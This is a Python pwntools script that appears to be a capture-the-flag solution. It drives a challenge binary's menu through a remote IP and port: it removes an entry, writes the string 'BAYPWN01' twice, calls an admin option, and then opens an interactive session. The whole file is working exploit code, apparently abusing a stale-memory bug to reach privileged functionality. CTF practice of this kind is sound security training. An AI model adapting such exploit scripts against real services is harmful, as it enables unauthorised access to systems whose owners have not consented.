#!/usr/bin/python
from pwn import *
exe = './chall'
elf = context.binary = ELF(exe, checksec = 0)
context.log_level = 'debug'
context.arch = 'amd64'

def write(script):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b": ", script)

def remove():
    io.sendlineafter(b">> ", b"2")

def admin():
    io.sendlineafter(b">> ", b"3")

def quit():
    io.sendlineafter(b">> ", b"4")

# io = process(exe)
io=remote("103.167.132.234", 24323)

remove()
write(b"BAYPWN01")
write(b"BAYPWN01")
admin()

io.interactive()